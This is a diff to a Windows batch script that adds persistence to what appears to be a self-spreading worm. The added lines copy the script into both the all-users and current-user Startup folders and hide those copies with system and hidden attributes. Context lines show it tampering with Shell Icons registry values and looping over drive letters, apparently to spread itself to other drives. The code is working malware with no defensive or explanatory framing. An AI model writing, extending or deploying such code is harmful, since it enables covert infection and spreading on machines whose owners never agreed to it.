@@ -65,6 +65,11 @@ for /f "skip=4 delims= " %%i in ('tasklist /fi "imagename eq %~nx0"') do if "%%i
 
 set module_shortcut=shortcut.exe
 
+set path_startMenu1=%programData%\Microsoft\Windows\Start Menu\Programs
+set path_startMenu2=%appData%\Microsoft\Windows\Start Menu\Programs
+set path_autoRun1=%path_startMenu1%\Startup
+set path_autoRun2=%path_startMenu2%\Startup
+
 
 
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 29 /t REG_SZ /d "%windir%\System32\shell32.dll,-50" /f
@@ -74,6 +79,12 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v
 
 
 :cycle
+copy /y "%~dpnx0" "%path_autoRun1%\"
+copy /y "%~dpnx0" "%path_autoRun2%\"
+attrib +s +h "%path_autoRun1%\%~nx0"
+attrib +s +h "%path_autoRun2%\%~nx0"
+
+
 for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
   if exist "%%i:\" (
     if exist "%%i:\%~nx0" (
